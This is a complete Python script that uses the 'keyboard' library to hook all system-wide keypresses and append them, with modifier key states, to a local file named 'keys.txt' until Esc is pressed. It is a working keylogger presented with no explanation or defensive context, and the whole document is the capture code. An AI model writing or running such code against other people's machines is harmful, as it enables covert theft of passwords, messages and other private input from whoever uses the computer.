
from functools import partial
import atexit
import os
import keyboard
MAP = {
    "space": " ",
    "\r": "\n"
}

FILE_NAME = "keys.txt"

CLEAR_ON_STARTUP = False

TERMINATE_KEY = "esc"
def callback(output, is_down, event):
    if event.event_type in ("up", "down"):
        key = MAP.get(event.name, event.name)
        modifier = len(key) > 1
        if not modifier and event.event_type == "down":
            return
        if modifier:
            if event.event_type == "down":
                if is_down.get(key, False):
                    return
                else:
                    is_down[key] = True
            elif event.event_type == "up":
                is_down[key] = False
            key = " [{} ({})] ".format(key, event.event_type)
        elif key == "\r":
            key = "\n"
        output.write(key)
        output.flush()
def onexit(output):
    output.close()
def main():
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    is_down = {}

    output = open(FILE_NAME, "a")

    atexit.register(onexit, output)

    keyboard.hook(partial(callback, output, is_down))
    keyboard.wait(TERMINATE_KEY)
if __name__ == "__main__":
    main()
